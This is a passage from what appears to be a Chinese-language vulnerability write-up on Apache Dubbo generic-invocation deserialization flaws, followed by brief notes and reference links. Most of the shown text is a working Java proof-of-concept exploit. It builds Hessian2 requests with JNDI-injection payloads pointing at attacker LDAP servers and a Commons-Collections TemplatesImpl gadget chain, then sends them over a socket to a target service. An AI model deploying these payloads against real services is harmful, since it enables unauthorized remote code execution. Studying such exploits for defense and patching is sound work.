        Hessian2ObjectOutput out = new Hessian2ObjectOutput(hessian2ByteArrayOutputStream);

        // set body
        out.writeUTF("2.7.9");
        // todo 此处填写Dubbo提供的服务名
        out.writeUTF("org.apache.dubbo.spring.boot.demo.consumer.DemoService");
        out.writeUTF("");
        out.writeUTF("$invoke");
        out.writeUTF("Ljava/lang/String;[Ljava/lang/String;[Ljava/lang/Object;");
        // todo 此处填写Dubbo提供的服务的方法
        out.writeUTF("sayHello");
        out.writeObject(new String[] {"java.lang.String"});

        // POC 1: raw.return
//        getRawReturnPayload(out, "ldap://127.0.0.1:8087/Exploit");

        // POC 2: bean
        getBeanPayload(out, "ldap://127.0.0.1:1389/xitdbc");

        // POC 3: nativejava
//        getNativeJavaPayload(out, "src\\main\\java\\top\\lz2y\\1.ser");

        out.flushBuffer();

        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, 12);
        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        //todo 此处填写Dubbo服务地址及端口
        Socket socket = new Socket("127.0.0.1", 9999);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
    private static void getRawReturnPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        HashMap jndi = new HashMap();
        jndi.put("class", "org.apache.xbean.propertyeditor.JndiConverter");
        jndi.put("asText", ldapUri);
        out.writeObject(new Object[]{jndi});

        HashMap map = new HashMap();
        map.put("generic", "raw.return");
        out.writeObject(map);
    }

    private static void getBeanPayload(Hessian2ObjectOutput out, String ldapUri) throws IOException {
        JavaBeanDescriptor javaBeanDescriptor = new JavaBeanDescriptor("org.apache.xbean.propertyeditor.JndiConverter",7);
        javaBeanDescriptor.setProperty("asText",ldapUri);
        out.writeObject(new Object[]{javaBeanDescriptor});
        HashMap map = new HashMap();

        map.put("generic", "bean");
        out.writeObject(map);
    }

    private static void getNativeJavaPayload(Hessian2ObjectOutput out, String serPath) throws Exception, NotFoundException {
        //创建TemplatesImpl对象加载字节码
        byte[] code = ClassPool.getDefault().get("ysoserial.vulndemo.Calc").toBytecode();
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj,"_name","RoboTerh");
        setFieldValue(obj,"_class",null);
        setFieldValue(obj,"_tfactory",new TransformerFactoryImpl());
        setFieldValue(obj,"_bytecodes",new byte[][]{code});

        //创建 ChainedTransformer实例
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{obj}),
        };
        ChainedTransformer chain = new ChainedTransformer(transformers);

        //创建TranformingComparator 实例
        Comparator comparator = new TransformingComparator(chain);

        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, comparator);

        //序列化
        ByteArrayOutputStream baor = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baor);
        oos.writeObject(priorityQueue);
        oos.close();
        byte[] payload = baor.toByteArray();

        out.writeObject(new Object[] {payload});

        HashMap map = new HashMap();
        map.put("generic", "nativejava");
        out.writeObject(map);
    }
```



### CVE-2023-23683

为了这醋才包的这盘饺子，但是分析到这明显发现是个很鸡肋的洞，同样需要已知接口全限定名，方法名，入参

* 漏洞影响：

2.7.0<=dubbo<=2.7.21

3.0.0<=dubbo<=3.0.13

3.1.0<=dubbo<=3.1.6

不想分析了，很鸡肋

https://alter1125.github.io/2023/03/17/CVE-2023-23638%20Dubbo%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/



参考：

https://wx.zsxq.com/group/2212251881/topic/814255445121452

https://wx.zsxq.com/group/2212251881/topic/581554451511544

https://alter1125.github.io/2023/03/17/CVE-2023-23638%20Dubbo%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/

https://xz.aliyun.com/news/11842

https://tttang.com/archive/1730/#toc_cve-2021-30179

